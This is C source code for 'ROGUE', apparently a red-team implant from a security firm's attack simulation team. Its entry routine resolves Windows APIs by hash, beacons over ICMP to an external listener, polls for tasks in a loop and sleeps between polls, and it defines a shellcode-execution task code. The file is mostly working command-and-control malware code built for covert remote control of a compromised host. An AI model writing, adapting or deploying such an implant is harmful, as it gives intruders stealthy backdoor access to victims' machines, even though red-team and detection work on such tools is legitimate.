/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
{
	UINT32	TaskCode;
	UINT32	TaskId;
	UINT32	Length;
	UCHAR	Buffer[0];
} CMD_REQ_HDR, *PCMD_REQ_HDR ;

typedef struct __attribute__(( packed, scalar_storage_order("big-endian" ) ))
{
	UINT32	TaskId;
	UINT32	ReturnCode;
	UINT32	ErrorValue;
	UCHAR	Buffer[0];
} CMD_RET_HDR, *PCMD_RET_HDR ;

typedef enum
{
	Hello = 0,
	ExitFree = 1,
	ShellcodeExecute = 2
} CMD ;

typedef struct
{
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Starts tasking back to Navi, executes the
 * task, sends the result, and then goes to
 * sleep.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API		Api;

	BOOL		Rcv = FALSE;
	DWORD		Res = 0;
	PBUFFER		Inb = NULL;
	PBUFFER		Onb = NULL;
	PROGUE_CTX	Ctx = NULL;
	PCMD_REQ_HDR	Req = NULL;
	PCMD_RET_HDR	Ret = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Create a buffer to hold the rogue context */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {

		/* Create a random integer constant */
		RandomString( Ctx->Id, sizeof( Ctx->Id ) );

		/* Create initial output buffer */
		if ( ( Onb = BufferCreate() ) != NULL ) {

			/* Append the starting ID */
			if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {

				/* Extend to support size of the return header */
				if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {

					/* Set return buffer header */
					Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
					Ret->TaskId     = 0;
					Ret->ReturnCode = 0;
					Ret->ErrorValue = 0;

					/* Execute "Hello" */
					if ( TaskHello( Ctx, NULL, 0, Onb ) ) {
						/* Change the IP to be configurable */
						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
					};
				};
			};

			/* Cleanup */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );

			/* Reset variables */
			Onb = NULL;
		};

		/* First hello sent and established */
		if ( Ctx->Established != FALSE ) {
			/* Start tasking loop. Finish once disconnected */
			for ( ; Ctx->Established != FALSE ; ) {
				/* Create an input command buffer */
				if ( ( Inb = BufferCreate( ) ) != NULL ) {
					/* Read in the incoming buffer */
					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
							if ( Inb->Length >= sizeof( CMD_REQ_HDR ) ) {

								/* Prepare the stack structures */
								RtlSecureZeroMemory( &Req, sizeof( Req ) );
								RtlSecureZeroMemory( &Ret, sizeof( Ret ) );

								/* Copy over the request */
								__builtin_memcpy( &Req, Inb->Buffer, sizeof( Req ) );

								/* Create an output buffer */
								if ( ( Onb = BufferCreate() ) != NULL ) {
									/* Add the ID to the front of the buffer */
									if ( BufferAddRaw( Onb, Ctx->Id, sizeof( Ctx->Id ) ) ) {
										/* Add the return header to the front */
										if ( BufferExtend( Onb, sizeof( CMD_RET_HDR ) ) ) {
											Req = C_PTR( Inb->Buffer );

											switch( Req->TaskCode ) {
												case Hello:
													/* Execute TaskHello */
													Res = TaskHello( Ctx, Req->Buffer, Req->Length, Onb );
													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );

													/* Set return info */
													Ret->TaskId = Req->TaskId;
													Ret->ReturnCode = Res;
													Ret->ErrorValue = NtCurrentTeb()->LastErrorValue;

													/* Dispatch response */
													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
													break;
												case ExitFree:
													/* Execute TaskExitFree */
													Ctx->Established = FALSE;
													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );

													/* Set return info */
													Ret->TaskId     = Req->TaskId;
													Ret->ReturnCode = 0;
													Ret->ErrorValue = 0;

													/* Dispatch response */
													IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
													break;
											};
										};
									}
									/* Cleanup */
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb->Buffer );
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Onb );

									/* Reset variables */
									Onb = NULL;
								};
							};
						};
					};

					/* Cleanup */
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );

					/* Reset variables */
					Inb = NULL; Rcv = FALSE;
				};
				/* ah shit!: insert obfuscate/sleep call here */
				if ( Ctx->Established != FALSE ) ( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
			};
		};

		/* Cleanup */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
		Ctx = NULL;
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
